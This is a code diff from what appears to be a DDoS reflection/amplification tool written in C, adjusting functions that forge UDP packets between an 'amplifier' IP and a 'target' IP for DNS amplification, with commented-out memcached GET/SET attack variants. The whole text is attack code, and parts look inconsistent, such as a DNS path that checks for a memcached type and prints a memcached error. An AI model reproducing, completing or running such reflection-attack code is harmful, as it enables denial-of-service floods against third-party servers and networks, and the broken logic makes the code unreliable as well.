@@ -17,13 +17,13 @@ void dnsSetValue( AttackPlan * p_atkData )
 {
     int sock = CreateSocket(RAW, NO_BLOCK);
     DNSheader response;
-    ConnectTCP(sock, p_atkData->setPacket);
 
+    ConnectTCP(sock, p_atkData->setPacket);
     for(Packet *tmpPkt = p_atkData->setPacket; tmpPkt != NULL; tmpPkt = tmpPkt->next)
     {
         if( SendPacket(sock, tmpPkt) < 0 )
         {
-            Efatal(ERROR_DNS, "error dns\n");
+            Efatal(ERROR_DNS, "error memcached\n");
         }
 
         recv(sock, &response, sizeof(DNSheader), 0);
@@ -31,26 +31,38 @@ void dnsSetValue( AttackPlan * p_atkData )
     CloseSocket(sock);
 }
 
-static AttackPlan * createAttackDataDNS( LhfDraft *p_draft )
+// static AttackPlan * createAttackDataGETSET( LhfDraft *p_draft )
+// {
+//     AttackPlan *newData;
+//     int arg;
+
+//     memalloc( (void *)&newData, sizeof( AttackPlan ) );
+//     arg = MEMCACHED_SET;
+//     newData->setPacket = ForgeTCP( p_draft->amp_ip, GetPort(p_draft->amp_port), ForgeMemcachedBinary, &arg );
+//     arg = MEMCACHED_GET;
+//     newData->getPacket = ForgeUDP( p_draft->amp_ip, p_draft->target_ip, GetPort(p_draft->amp_port), ForgeMemcachedText, &arg );
+//     newData->draft = p_draft;
+//     return newData;
+// }
+
+static AttackPlan * createAttackDNS( LhfDraft *p_draft )
 {
     AttackPlan *newData;
     int arg;
 
     memalloc( (void *)&newData, sizeof( AttackPlan ) );
     arg = DNS;
-    //newData->setPacket = ForgeTCP( p_draft->amp_ip, GetPort(p_draft->amp_port), ForgeDnsBinary, &arg );
-    newData->setPacket = ForgeUDP( p_draft->amp_ip, p_draft->target_ip, GetPort(p_draft->amp_port), ForgeDNS, &arg );
-    // newData->setPacket = NULL;
-    // newData->getPacket = ForgeUDP( p_draft->amp_ip, p_draft->target_ip, GetPort(p_draft->amp_port), ForgeDnsBinaryText, &arg );
+    newData->setPacket = NULL;
     newData->getPacket = ForgeUDP( p_draft->amp_ip, p_draft->target_ip, GetPort(p_draft->amp_port), ForgeDNS, &arg );
     newData->draft = p_draft;
     return newData;
 }
 
-void executeAttackDns( AttackPlan * atkData )
+void executeAttackDNS( AttackPlan * atkData )
 {
     char *fileName = (atkData->draft->logfile[0] == '\0') ? NULL : atkData->draft->logfile;
-    if(atkData->draft->type == DNS)
+    
+    if(atkData->draft->type == MEMCACHED_GETSET)
     {
         dnsSetValue( atkData );
     }
@@ -61,13 +73,20 @@ int  ExecuteDnsMirror( void *p_draft )
 {
     AttackPlan *plan;
     LhfDraft *draft = (LhfDraft *)p_draft;
+
     switch( draft->type )
     {
+        // case MEMCACHED_GETSET:
+        //     plan = createAttackDataGETSET( draft );
+        //     break;
+
         case DNS:
         default:
-            plan = createAttackDataDNS( draft );
+            plan = createAttackDNS( draft );
             break;
     }
-    executeAttackDns(plan);
+    executeAttackDNS(plan);
     return 0;
 }
+
+
